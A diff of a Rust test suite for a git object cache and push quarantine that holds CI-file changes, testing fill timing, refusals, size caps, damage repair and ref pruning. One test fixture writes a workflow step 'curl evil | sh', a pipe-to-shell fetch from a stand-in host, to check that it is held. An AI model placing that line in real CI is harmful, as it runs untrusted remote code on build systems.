@@ -14,7 +14,9 @@ use std::sync::mpsc;
 use std::time::Duration;
 
 use purlis_core::forge::Kind;
-use purlis_core::heldact::{FromForge, ObjectCache, PushCheck, Quarantine, check_push_since};
+use purlis_core::heldact::{
+    BaseObjects, FromForge, ObjectCache, PUSH, PushCheck, Quarantine, check_push_since,
+};
 use purlis_core::mergehold::HeadSha;
 
 use crate::support::git;
@@ -121,8 +123,22 @@ impl Scene {
         FromForge {
             url: self.forge.to_string_lossy().into_owned(),
             helper: None,
-            cache: Some(self.cache()),
+            cache: Some(self.cache().for_a_push(PUSH)),
         }
+    }
+
+    /// The cache is filled: the first push is refused at once, the cache fills on its own thread,
+    /// and the pushes after it are served.
+    fn fill(&self) {
+        let first = Quarantine::open(self.quarantines.path(), &self.base, &self.from());
+        let refused = first.err().expect("the first push finds the cache empty");
+        assert!(refused.contains("still reading"), "{refused}");
+        wait_until_idle(&self.cache());
+        assert!(self.cache().is_filled(), "the fill finished");
+    }
+
+    fn the_cache_dir(&self) -> PathBuf {
+        self.cache().path().to_path_buf()
     }
 
     /// The forge gets one more commit on `main`.
@@ -158,11 +174,20 @@ impl Scene {
     }
 }
 
+/// Waits for the cache's own thread to finish.
+fn wait_until_idle(cache: &ObjectCache) {
+    let until = std::time::Instant::now() + Duration::from_secs(60);
+    while cache.is_filling() {
+        assert!(std::time::Instant::now() < until, "the fill never ended");
+        std::thread::sleep(Duration::from_millis(20));
+    }
+}
+
 #[test]
 fn the_second_push_to_a_repo_fetches_only_what_the_forge_gained() {
     purlis_core::unsteered!();
     let s = scene();
-    drop(Quarantine::open(s.quarantines.path(), &s.base, &s.from()).unwrap());
+    s.fill();
     let cache = s.cache();
     let after_the_first = own_objects(cache.path());
     assert!(
@@ -181,6 +206,7 @@ fn the_second_push_to_a_repo_fetches_only_what_the_forge_gained() {
 fn the_quarantine_holds_the_pushed_pack_and_none_of_the_history_it_reads_through() {
     purlis_core::unsteered!();
     let s = scene();
+    s.fill();
     let from = s.from();
     let quarantine = Quarantine::open(s.quarantines.path(), &s.base, &from).unwrap();
     assert_eq!(
@@ -205,7 +231,7 @@ fn a_ci_file_change_in_a_new_commit_is_still_held_when_the_base_comes_from_the_c
     let s = scene();
     let from = s.from();
     // The cache already holds the base: the history is read through it, not fetched again.
-    drop(Quarantine::open(s.quarantines.path(), &s.base, &from).unwrap());
+    s.fill();
     let quarantine = Quarantine::open(s.quarantines.path(), &s.base, &from).unwrap();
     let tip = s.chat_commits(&s.base, |chat| {
         write(
@@ -223,53 +249,142 @@ fn a_ci_file_change_in_a_new_commit_is_still_held_when_the_base_comes_from_the_c
     }
 }
 
+/// What a fetch that never finishes in time does: waits for `bound`, then fails as git does.
+fn slow_then(bound_seen: &std::sync::Arc<std::sync::atomic::AtomicUsize>) -> purlis_core::heldact::Fetch {
+    let calls = bound_seen.clone();
+    std::sync::Arc::new(move |_, bound| {
+        if calls.fetch_add(1, std::sync::atomic::Ordering::SeqCst) == 0 {
+            std::thread::sleep(bound);
+            Err("git took longer than it was given and was stopped".to_owned())
+        } else {
+            Ok(())
+        }
+    })
+}
+
+fn ok_fetch() -> purlis_core::heldact::Fetch {
+    std::sync::Arc::new(|_, _| Ok(()))
+}
+
+fn soon() -> std::time::Instant {
+    std::time::Instant::now() + Duration::from_secs(30)
+}
+
 #[test]
 fn a_push_during_the_first_fill_is_refused_at_once_and_says_why() {
+    purlis_core::unsteered!();
     let s = scene();
     let cache = s.cache();
     let (filling, fill_started) = mpsc::channel::<()>();
     let (finish, finished) = mpsc::channel::<()>();
-    let first = {
-        let cache = cache.clone();
-        std::thread::spawn(move || {
-            cache.update(|_| {
-                filling.send(()).unwrap();
-                finished.recv().unwrap();
-                Ok(())
-            })
-        })
-    };
-    fill_started.recv().unwrap();
-    let refused = cache.update(|_| Ok(())).unwrap_err();
+    let finished = std::sync::Mutex::new(finished);
+    let filling = std::sync::Mutex::new(filling);
+    let fill: purlis_core::heldact::Fetch = std::sync::Arc::new(move |_, _| {
+        filling.lock().unwrap().send(()).unwrap();
+        finished.lock().unwrap().recv().unwrap();
+        Ok(())
+    });
+    // The push that finds the cache empty is refused at once, and the fill goes on without it.
+    let started = std::time::Instant::now();
+    let first = cache.update(soon(), fill).unwrap_err();
+    assert!(started.elapsed() < Duration::from_secs(5), "answered at once");
     assert!(
-        refused.contains("still reading forge.test/owner/repo from the forge for the first time"),
-        "{refused}"
+        first.contains("still reading forge.test/owner/repo from the forge for the first time"),
+        "{first}"
     );
+    fill_started.recv().unwrap();
+    assert!(cache.is_filling());
+    let second = cache.update(soon(), ok_fetch()).unwrap_err();
+    assert!(second.contains("for the first time"), "{second}");
     finish.send(()).unwrap();
-    first.join().unwrap().unwrap();
+    wait_until_idle(&cache);
+    assert!(cache.is_filled());
+    cache.update(soon(), ok_fetch()).unwrap();
+}
+
+#[test]
+fn a_failed_fill_leaves_the_cache_not_filled_and_the_next_text_says_again() {
+    purlis_core::unsteered!();
+    let s = scene();
+    let cache = s.cache();
+    let failing: purlis_core::heldact::Fetch =
+        std::sync::Arc::new(|_, _| Err("the forge said no".to_owned()));
+    cache.update(soon(), failing).unwrap_err();
+    wait_until_idle(&cache);
+    assert!(!cache.is_filled(), "a fill that failed is not a filled cache");
+    let again = cache.update(soon(), ok_fetch()).unwrap_err();
+    assert!(again.contains("again"), "{again}");
+    assert!(!again.contains("first time"), "{again}");
+    assert!(again.contains("the forge said no"), "{again}");
+    wait_until_idle(&cache);
+    assert!(cache.is_filled(), "the next fill, which succeeded");
+}
+
+#[test]
+fn a_top_up_past_the_pushs_time_is_refused_with_why_inside_the_connection_limit() {
+    purlis_core::unsteered!();
+    let s = scene();
+    let cache = s.cache();
+    cache.update(soon(), ok_fetch()).unwrap_err();
+    wait_until_idle(&cache);
+    assert!(cache.is_filled());
+    let calls = std::sync::Arc::new(std::sync::atomic::AtomicUsize::new(0));
+    let started = std::time::Instant::now();
+    let within = Duration::from_millis(300);
+    let refused = cache
+        .update(started + within, slow_then(&calls))
+        .unwrap_err();
+    assert!(refused.contains("within"), "{refused}");
+    assert!(refused.contains("try the push again"), "{refused}");
+    assert!(
+        started.elapsed() < Duration::from_secs(10),
+        "the refusal came inside the push's time"
+    );
+    // The read goes on on the cache's own thread, so the next push finds it done.
+    wait_until_idle(&cache);
+    assert_eq!(calls.load(std::sync::atomic::Ordering::SeqCst), 2);
+    assert!(cache.is_filled());
+}
+
+#[test]
+fn the_time_a_push_has_for_all_its_fetches_is_inside_the_connection_limit_and_above_one_call() {
+    purlis_core::unsteered!();
+    // A bound that reverted to the per-call limit would cut a chain of fetches short, and one
+    // that reached the listener's total would let a verdict be written to a closed connection.
+    assert!(PUSH > purlis_core::worktree::git::NETWORK, "{PUSH:?}");
+    let total = purlis_core::forge::proxy::listener::Limits::default().total;
+    assert!(PUSH * 2 <= total, "{PUSH:?} against {total:?}");
+    assert!(purlis_core::heldact::FILL > total);
 }
 
 #[test]
 fn a_push_during_a_later_update_waits_for_it_and_is_not_refused() {
+    purlis_core::unsteered!();
     let s = scene();
     let cache = s.cache();
-    cache.update(|_| Ok(())).unwrap();
+    cache.update(soon(), ok_fetch()).unwrap_err();
+    wait_until_idle(&cache);
     let (updating, update_started) = mpsc::channel::<()>();
     let (finish, finished) = mpsc::channel::<()>();
+    let updating = std::sync::Mutex::new(updating);
+    let finished = std::sync::Mutex::new(finished);
     let first = {
         let cache = cache.clone();
         std::thread::spawn(move || {
-            cache.update(|_| {
-                updating.send(()).unwrap();
-                finished.recv().unwrap();
-                Ok(())
-            })
+            cache.update(
+                soon(),
+                std::sync::Arc::new(move |_, _| {
+                    updating.lock().unwrap().send(()).unwrap();
+                    finished.lock().unwrap().recv().unwrap();
+                    Ok(())
+                }),
+            )
         })
     };
     update_started.recv().unwrap();
     let second = {
         let cache = cache.clone();
-        std::thread::spawn(move || cache.update(|_| Ok(())))
+        std::thread::spawn(move || cache.update(soon(), ok_fetch()))
     };
     std::thread::sleep(Duration::from_millis(200));
     finish.send(()).unwrap();
@@ -277,8 +392,215 @@ fn a_push_during_a_later_update_waits_for_it_and_is_not_refused() {
     second.join().unwrap().unwrap();
 }
 
+/// A fetch that puts `bytes` into the cache's object store.
+fn grows_by(bytes: usize) -> purlis_core::heldact::Fetch {
+    std::sync::Arc::new(move |dir, _| {
+        let pack = dir.join(".git/objects/pack");
+        std::fs::create_dir_all(&pack).unwrap();
+        std::fs::write(pack.join("grown"), vec![0u8; bytes]).unwrap();
+        Ok(())
+    })
+}
+
+#[test]
+fn a_cache_past_its_cap_is_made_again_when_no_other_push_is_reading_it() {
+    purlis_core::unsteered!();
+    let parent = tempfile::tempdir().unwrap();
+    let cache = ObjectCache::of_capped(parent.path(), "forge.test", "owner/grows", 5_000);
+    cache.update(soon(), grows_by(1_000)).unwrap_err();
+    wait_until_idle(&cache);
+    cache.update(soon(), grows_by(10_000)).unwrap();
+    assert!(cache.objects().join("pack/grown").is_file());
+    // Over its cap now, and the quarantine being opened is the one lease: made again, and filled
+    // again on its own thread.
+    let _opening = cache.lease();
+    let refused = cache.update(soon(), grows_by(1_000)).unwrap_err();
+    assert!(refused.contains("again"), "{refused}");
+    wait_until_idle(&cache);
+    assert_eq!(
+        std::fs::metadata(cache.objects().join("pack/grown")).unwrap().len(),
+        1_000,
+        "what was there is gone and what was fetched since is all it holds"
+    );
+}
+
+#[test]
+fn a_cache_is_not_made_again_while_another_quarantine_reads_through_it() {
+    purlis_core::unsteered!();
+    let parent = tempfile::tempdir().unwrap();
+    let cache = ObjectCache::of_capped(parent.path(), "forge.test", "owner/leased", 5_000);
+    cache.update(soon(), grows_by(1_000)).unwrap_err();
+    wait_until_idle(&cache);
+    cache.update(soon(), grows_by(10_000)).unwrap();
+    let _a = cache.lease();
+    let _b = cache.lease();
+    // Over its cap, but read by another push: used as it is.
+    cache.update(soon(), ok_fetch()).unwrap();
+    assert_eq!(
+        std::fs::metadata(cache.objects().join("pack/grown")).unwrap().len(),
+        10_000
+    );
+    // And a damaged one is not removed from under it either.
+    std::fs::remove_file(cache.path().join(".git/HEAD")).unwrap();
+    let refused = cache.update(soon(), ok_fetch()).unwrap_err();
+    assert!(refused.contains("damaged"), "{refused}");
+    assert!(cache.path().join(".git/objects").is_dir());
+}
+
+#[test]
+fn a_repo_whose_history_alone_is_past_the_cap_is_refused_and_not_deleted_every_push() {
+    purlis_core::unsteered!();
+    let parent = tempfile::tempdir().unwrap();
+    let cache = ObjectCache::of_capped(parent.path(), "forge.test", "owner/huge", 5_000);
+    cache.update(soon(), grows_by(20_000)).unwrap_err();
+    wait_until_idle(&cache);
+    for _ in 0..3 {
+        let refused = cache.update(soon(), ok_fetch()).unwrap_err();
+        assert!(refused.contains("more history than"), "{refused}");
+        assert_eq!(
+            std::fs::metadata(cache.objects().join("pack/grown")).unwrap().len(),
+            20_000,
+            "not deleted to be fetched again"
+        );
+    }
+}
+
+#[test]
+fn a_damaged_cache_is_made_again_and_the_next_push_goes_on() {
+    purlis_core::unsteered!();
+    let s = scene();
+    s.fill();
+    let dot = s.cache().path().join(".git");
+    // An empty `.git`, which git looks past to a repository above, and a missing HEAD.
+    for damage in ["empty", "no HEAD"] {
+        if damage == "empty" {
+            std::fs::remove_dir_all(&dot).unwrap();
+            std::fs::create_dir(&dot).unwrap();
+        } else {
+            std::fs::remove_file(dot.join("HEAD")).unwrap();
+        }
+        let refused = Quarantine::open(s.quarantines.path(), &s.base, &s.from())
+            .err()
+            .expect("the cache is read again");
+        assert!(refused.contains("again"), "{damage}: {refused}");
+        wait_until_idle(&s.cache());
+        Quarantine::open(s.quarantines.path(), &s.base, &s.from())
+            .unwrap_or_else(|why| panic!("{damage}: the push goes on once it is made again: {why}"));
+    }
+}
+
+#[test]
+fn what_a_killed_fetch_left_is_removed_before_the_next_one() {
+    purlis_core::unsteered!();
+    let s = scene();
+    s.fill();
+    let pack = s.cache().objects().join("pack");
+    std::fs::write(pack.join("tmp_pack_Ab12Cd"), vec![0u8; 100]).unwrap();
+    std::fs::write(pack.join("keep.txt"), b"").unwrap();
+    s.forge_moves_on("more.txt");
+    drop(Quarantine::open(s.quarantines.path(), &s.base, &s.from()).unwrap());
+    assert!(!pack.join("tmp_pack_Ab12Cd").exists());
+    assert!(pack.join("keep.txt").exists(), "only a killed fetch's leftovers go");
+}
+
+fn base_ref(cache: &ObjectCache, name: &str, to: &HeadSha) {
+    git(
+        cache.path(),
+        &["update-ref", &format!("refs/quarantine/{name}"), to.as_str()],
+    );
+}
+
+fn refs_of(cache: &ObjectCache, dir: &str) -> Vec<String> {
+    let out = git(
+        cache.path(),
+        &["for-each-ref", "--format=%(refname)", &format!("refs/quarantine/{dir}")],
+    );
+    String::from_utf8(out.stdout)
+        .unwrap()
+        .lines()
+        .map(|name| name.rsplit('/').next().unwrap().to_owned())
+        .collect()
+}
+
+#[test]
+fn the_bases_kept_are_the_last_used_and_the_one_just_fetched_is_always_among_them() {
+    purlis_core::unsteered!();
+    let s = scene();
+    s.fill();
+    let cache = s.cache();
+    let id = |n: usize| format!("{n:040x}");
+    for n in 0..40 {
+        base_ref(&cache, &format!("base/{}", id(n)), &s.base);
+        cache.keep_base(&id(n));
+    }
+    let kept = refs_of(&cache, "base");
+    assert_eq!(kept.len(), 32, "{kept:?}");
+    assert!(kept.contains(&id(39)) && !kept.contains(&id(0)));
+    // The oldest still kept is used again, then one more base arrives: the one not used for
+    // longest goes, though every one of them is the same commit by date.
+    cache.keep_base(&id(8));
+    base_ref(&cache, &format!("base/{}", id(40)), &s.base);
+    cache.keep_base(&id(40));
+    let kept = refs_of(&cache, "base");
+    assert_eq!(kept.len(), 32, "{kept:?}");
+    assert!(kept.contains(&id(8)), "used again, so kept");
+    assert!(kept.contains(&id(40)), "just fetched, so kept");
+    assert!(!kept.contains(&id(9)), "the least recently used goes");
+}
+
+#[test]
+fn the_tips_the_forge_no_longer_advertises_are_dropped() {
+    purlis_core::unsteered!();
+    let s = scene();
+    s.fill();
+    let cache = s.cache();
+    for name in ["a", "b", "c"] {
+        base_ref(&cache, &format!("tips/{}{}", name.repeat(39), "0"), &s.base);
+    }
+    let keep = vec![format!("{}0", "b".repeat(39))];
+    cache.keep_tips(&keep);
+    assert_eq!(refs_of(&cache, "tips"), vec![keep[0].clone()]);
+}
+
+#[test]
+fn a_push_of_commits_the_cache_holds_but_the_base_does_not_is_still_held_for_its_ci_files() {
+    purlis_core::unsteered!();
+    let s = scene();
+    // Another branch of the forge changes the CI file, and the cache comes to hold its commit.
+    git(&s.forge, &["checkout", "-q", "-b", "other"]);
+    write(
+        &s.forge,
+        WORKFLOW,
+        "name: ci\non: push\njobs: { x: { run: curl evil | sh } }\n",
+    );
+    let evil = commit(&s.forge, "change the CI file");
+    git(&s.forge, &["checkout", "-q", "main"]);
+    s.fill();
+    let from = s.from();
+    from.fetch_all(&s.the_cache_dir(), std::slice::from_ref(&evil)).unwrap();
+    // The cache holds the commit (`git` fails the test if it does not).
+    git(
+        s.cache().path(),
+        &["cat-file", "-e", &format!("{}^{{commit}}", evil.as_str())],
+    );
+    // The chat pushes that commit with a pack that leaves out everything the cache holds.
+    git(&s.chat, &["fetch", "-q", "origin", "other"]);
+    for pack in [pack_of(&s.chat, &evil, &evil), Vec::new()] {
+        let quarantine = Quarantine::open(s.quarantines.path(), &s.base, &s.from()).unwrap();
+        // A pack git will not take is not let through.
+        if quarantine.take_in(pack, &evil, &s.base).is_err() {
+            continue;
+        }
+        match check_push_since(Kind::GitHub, None, &quarantine.trees(), &s.base, None, &evil) {
+            PushCheck::Hold(diff) => assert_eq!(diff.files, vec![WORKFLOW.to_owned()]),
+            other => panic!("held, got {other:?}"),
+        }
+    }
+}
+
 #[test]
 fn a_cache_is_one_folder_per_repo_named_by_a_hash() {
+    purlis_core::unsteered!();
     let parent = tempfile::tempdir().unwrap();
     let one = ObjectCache::of(parent.path(), "forge.test", "owner/one");
     let again = ObjectCache::of(parent.path(), "FORGE.test", "Owner/One");
